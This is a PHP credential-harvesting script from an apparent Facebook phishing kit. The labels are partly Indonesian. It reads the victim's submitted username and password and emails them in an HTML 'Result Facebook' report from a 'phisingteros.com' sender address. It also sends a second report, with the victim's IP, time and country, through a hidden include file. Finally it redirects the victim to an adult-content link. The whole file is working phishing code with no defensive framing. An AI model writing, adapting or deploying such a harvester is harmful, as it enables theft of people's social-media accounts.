<?php
require 'detect.php';
include 'email.php';
$IP = getenv("REMOTE_ADDR");
$date = date("d M, Y");
$times = date("g:i a");
$code = $_SESSION['ip_countryCode']=clientData('code');
$country = strtolower($code);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$user = $_POST['user'];
$pass = $_POST['pass'];
$email = $_POST['email'];
$password = $_POST['password'];
$login = $_POST['login'];

if ($user == "" && $pass == "")
{
  header("Location: index.php");
} else {
 $subject = "Result Facebook ";
$message = '
<center> 
<div style="background: url(https://raw.githubusercontent.com/genjehhh1/pabjii/main/banner.png) no-repeat center center; background-size: 100% 100%; width: 294; height: 100px; color: #000; text-align: center; border-top-left-radius: 5px; border-top-right-radius: 5px;"></div>
<div style="background: #000; width: 294; color: #fff; text-align: left; padding: 10px;">Informasi Akun</div>
<table style="border-collapse: collapse; border-color: #000; background: #fff" width="100%" border="1">
<tr>
<div style="padding:4px;width:444;height:auto;background: #222222;color:#ffc;text-align:center;">
<font size="3.5"><b>Result Facebook 18+</b></font>
</div>
<table style="border-collapse:collapse;background:#ffc" width="100%" border="1">
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>EMAIL/PHONE/USERNAME</th>
<th style="width: 78%; text-align: center;"><b>'.$user.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>PASSWORD</th>
<th style="width: 78%; text-align: center;"><b>'.$pass.'</th> 
</tr>
 </table>
<div style="width: 294; height: 40px; background: #000; color: #fff; padding: 10px; border-bottom-left-radius: 5px; border-bottom-right-radius: 5px; text-align: center;">
<div style="float: left; margin-top: 3%;">
Temukan saya:
</div>
<div style="float: right;">
<a href="https://t.me/berbagisc"><img style="margin: 5px;" width="30" src="https://i.ibb.co/PCsB6xD/telegram.png"></a>
</div>
</div>
</center>
';
include 'email.php';
$headersx  = 'MIME-Version: 1.0' . "\r\n";
$headersx .=  'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headersx .= 'From: AA NOOB <Result@phisingteros.com>' . "\r\n";
$datamail = mail($email, $subject, $message, $headersx);

$url =include("setting/.masuk.php");



$msg = ("
❗️=========== Result ACC ===========❗️


[Login] = ".$login."
PUNYA SI  = ".$email."
PASSWORD  = ".$password."

😳😳😳😳😳😳😳😳😳😳😳😳😳😳😳😳😳😳
[IP INFO] = http://www.geoiptool.com/?IP=".$IP."
[TIME/DATE] =".$times." / ".$date."/".$country."
😳😳😳😳😳😳😳😳😳😳😳😳😳😳😳😳😳😳
");

$url = $msg;include("setting/.masuk.php");

}


?>
<html>
<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<meta http-equiv="REFRESH" content="0;url=https://bit.ly/GrupBokep_2021">
</head>
<body>
</body>
</html>
